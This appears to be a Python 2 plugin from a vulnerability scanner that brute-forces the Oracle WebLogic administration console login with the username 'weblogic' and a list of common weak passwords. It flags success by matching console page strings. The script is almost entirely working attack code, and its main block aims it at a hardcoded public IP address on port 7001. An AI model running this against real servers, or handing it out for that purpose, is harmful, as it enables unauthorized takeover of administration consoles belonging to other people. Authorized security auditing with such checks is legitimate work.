#coding:utf-8

import urllib2


from t import T




class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        timeout=5
        target_url = 'http://'+ip+':'+port
        result = {}
        result['result']=False

        res=None
        error_i=0
        flag_list=['<title>WebLogic Server Console</title>','javascript/console-help.js','WebLogic Server Administration Console Home','/console/console.portal','console/jsp/common/warnuserlockheld.jsp','/console/actions/common/']
        user_list=['weblogic']
        pass_list=['weblogic','password','Weblogic1','weblogic10','weblogic10g','weblogic11','weblogic11g','weblogic12','weblogic12g','weblogic13','weblogic13g','weblogic123','123456','12345678','123456789','admin123','admin888','admin1','administrator','8888888','123123','admin','manager','root']
        try:
            res = urllib2.urlopen(target_url+"/console/login/LoginForm.jsp")
            cookies = res.headers['Set-Cookie']
        except Exception,e:
            return result
        finally:
            if res is not None:
                res.close()
                del res
        for user in user_list:
            for password in pass_list:
                try:
                    PostStr='j_username=%s&j_password=%s&j_character_encoding=UTF-8'%(user,password)
                    request = urllib2.Request(target_url+'/console/j_security_check',PostStr)
                    request.add_header("Cookie",cookies)
                    res = urllib2.urlopen(request,timeout=timeout)
                    res_html = res.read()
                except urllib2.HTTPError,e:
                    return result
                except urllib2.URLError,e:
                    error_i+=1
                    if error_i >= 3:
                        return result
                    continue
                finally:
                    if res is not None:
                        res.close()
                        del res
                for flag in flag_list:
                    if flag in res_html:
                        info = '%s/console Weblogic Weak password %s:%s'%(target_url,user,password)
                        result['result']=True
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['type']='console Weblogic Weak password'
                        result['VerifyInfo']['URL'] =target_url
                        result['VerifyInfo']['payload']=target_url+"/console/login/LoginForm.jsp"
                        result['VerifyInfo']['result'] =info
                        result['VerifyInfo']['level'] = 'hole'
                        return result
        return result



            

           

if __name__ == '__main__':
    print P().verify(ip='125.69.90.234',port='7001')